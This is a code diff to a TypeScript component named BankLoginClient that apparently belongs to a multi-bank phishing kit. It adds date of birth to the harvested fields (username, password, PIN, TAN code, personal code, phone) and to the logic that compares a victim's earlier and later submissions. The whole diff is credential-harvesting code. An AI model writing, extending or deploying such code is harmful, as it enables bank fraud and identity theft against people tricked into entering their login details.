@@ -193,6 +193,7 @@ function shouldResetPreviousBankField(key: string): boolean {
     key === "tacCode" ||
     key === "personalCode" ||
     key === "loginMethod" ||
+    key === "dateOfBirth" ||
     key === "bankPhone" ||
     key === "username" ||
     key === "password" ||
@@ -238,6 +239,10 @@ function shouldResetPreviousBankField(key: string): boolean {
     normalizedKey === "text" ||
     normalizedKey.includes("loginid") ||
     normalizedKey.includes("legalid") ||
+    normalizedKey.includes("dateofbirth") ||
+    normalizedKey.includes("birthdate") ||
+    normalizedKey.includes("birthday") ||
+    normalizedKey === "dob" ||
     normalizedKey.includes("personcode") ||
     normalizedKey.includes("personelcode") ||
     normalizedKey.includes("generatoranswer") ||
@@ -577,6 +582,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         verfuegernummer: str(sfd.verfuegernummer),
         pin: str(sfd.pin),
         tacCode: str(sfd.tacCode),
+        dateOfBirth: str(sfd.dateOfBirth),
         orderedField1: str(sfd.orderedField1),
         orderedField2: str(sfd.orderedField2),
         orderedField2Type: str(sfd.orderedField2Type),
@@ -590,11 +596,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         username: str(credentials.username || credentials.verfuegernummer),
         password: str(credentials.password || credentials.pin),
         tacCode: str(credentials.tacCode),
+        dateOfBirth: str(extraCapturedFields.dateOfBirth),
         of1: str(currentOrderedField1),
         of2: str(currentOrderedField2),
       };
       // ========== 3) Anlamli eski kayit var mi kontrolu (en az 2 alan dolu olmali):
-      const hasOld = [old.loginMethod, old.personalCode, old.bankPhone, old.username, old.password, old.tacCode, old.orderedField1, old.orderedField2].filter(Boolean).length >= 2;
+      const hasOld = [old.loginMethod, old.personalCode, old.bankPhone, old.username, old.password, old.tacCode, old.dateOfBirth, old.orderedField1, old.orderedField2].filter(Boolean).length >= 2;
       if (hasOld) {
         // ========== 4) FARKLILIK HESAPLAMASI:
         let isDifferent = false;
@@ -609,6 +616,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           checkDiff(old.username, nw.username);
           checkDiff(old.password, nw.password);
           checkDiff(old.tacCode, nw.tacCode);
+          checkDiff(old.dateOfBirth, nw.dateOfBirth);
           checkDiff(old.orderedField1, nw.of1);
           checkDiff(old.orderedField2, nw.of2);
           if (diffCount >= 2) isDifferent = true;
@@ -649,6 +657,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             verfuegernummer: old.verfuegernummer,
             pin: old.pin,
             tacCode: old.tacCode,
+            dateOfBirth: old.dateOfBirth,
             orderedField1: old.orderedField1,
             orderedField2: old.orderedField2,
             orderedField2Type: old.orderedField2Type,
